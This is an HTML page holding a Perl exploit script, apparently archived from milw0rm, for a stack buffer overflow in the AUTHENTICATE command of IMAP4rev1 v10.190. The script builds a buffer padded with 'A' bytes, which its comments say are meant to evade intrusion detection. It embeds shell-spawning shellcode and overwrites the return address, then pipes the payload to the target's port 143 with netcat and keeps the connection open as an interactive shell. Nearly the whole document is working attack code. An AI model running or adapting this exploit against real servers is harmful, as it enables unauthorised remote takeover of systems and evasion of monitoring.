<html><head><title>IMAP4rev1 10.190 Authentication Stack Overflow Exploit</title></head><pre>#!/usr/bin/perl

## * Successfully tested on IMAP4rev1 v10.190 *
## Written by: teleh0r@doglover.com / anno 2000
##
## This is nothing new - just wrote it for fun.

$shellcode = &quot;\xeb\x35\x5e\x80\x46\x01\x30\x80\x46\x02\x30\x80&quot;.
             &quot;\x46\x03\x30\x80\x46\x05\x30\x80\x46\x06\x30\x89&quot;.
             &quot;\xf0\x89\x46\x08\x31\xc0\x88\x46\x07\x89\x46\x0c&quot;.
             &quot;\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80&quot;.
             &quot;\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xc6\xff\xff\xff&quot;.
             &quot;\x2f\x32\x39\x3e\x2f\x43\x38&quot;;


$len = 1052;       # Sufficient to overwrite the return value.
$nop = A;          # Using A/0x41 as nops to try to fool IDS.
$ret = 0xbffff30f; # Return Value / ESP / Stack Pointer.

if (@ARGV &lt; 2) {
    print(&quot;Usage: $0 &lt;target&gt; &lt;offset&gt;\n&quot;);
    exit(1);
}

($target, $offset) = @ARGV;

for ($i = 0; $i &lt; ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}

$buffer .= $shellcode;
$new_ret = pack('l', ($ret + $offset));

for ($i += length($shellcode); $i &lt; $len; $i += 4) {
    $buffer .= $new_ret;
}

$exploit_string = &quot;* AUTHENTICATE {$len}\015\012$buffer\012&quot;;

system(&quot;(echo -e \&quot;$exploit_string\&quot; ; cat) | nc $target 143&quot;);


# milw0rm.com [2001-01-19]</pre></html>